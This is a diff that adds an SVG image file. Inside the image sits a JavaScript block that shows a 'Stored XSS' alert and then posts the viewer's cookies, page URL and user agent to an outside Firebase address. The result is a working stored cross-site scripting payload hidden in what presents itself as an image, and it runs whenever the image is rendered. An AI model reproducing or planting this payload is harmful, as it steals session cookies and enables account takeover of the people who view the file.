@@ -1,0 +1,29 @@
+<?xml version="1.0" standalone="no"?>
+<svg version="1.1" xmlns="http://w3.org" xmlns:xlink="http://w3.org" viewBox="0 0 500 500">
+  <!-- Foto Background -->
+  <image xlink:href="https://amazonaws.com" x="0" y="0" width="500" height="500" />
+
+  <!-- Indikator Lingkaran -->
+  <circle cx="50" cy="50" r="40" fill="red" fill-opacity="0.7" />
+
+  <script type="text/javascript">
+    <![CDATA[
+    (function() {
+      alert('Stored XSS From Denzy ZeroDay');
+
+      const data = {
+        msg: "XSS Triggered",
+        cookie: document.cookie,
+        url: window.location.href,
+        ua: navigator.userAgent
+      };
+
+      fetch('https://firebasedatabase.app', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(data)
+      }).catch(err => console.log('Fetch error:', err));
+    })();
+    ]]>
+  </script>
+</svg>
